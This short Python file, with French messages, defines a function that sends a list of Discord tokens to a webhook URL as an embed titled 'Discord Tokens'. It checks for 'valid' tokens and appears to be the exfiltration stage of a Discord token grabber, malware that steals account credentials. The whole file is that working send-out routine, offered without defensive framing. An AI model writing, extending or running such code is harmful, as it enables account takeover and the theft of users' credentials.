import requests

def send_tokens_via_webhook(tokens, webhook_url):
    if not tokens:
        print("Aucun token valide trouvé.")
        return False

    data = {
        "content": "",
        "embeds": [
            {
                "title": "Discord Tokens",
                "description": "\n".join(tokens),
                "color": 3447003
            }
        ]
    }

    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Tokens envoyés avec succès via le webhook.")
        return True
    else:
        print(f"Erreur lors de l'envoi via le webhook: {response.status_code}")
        return False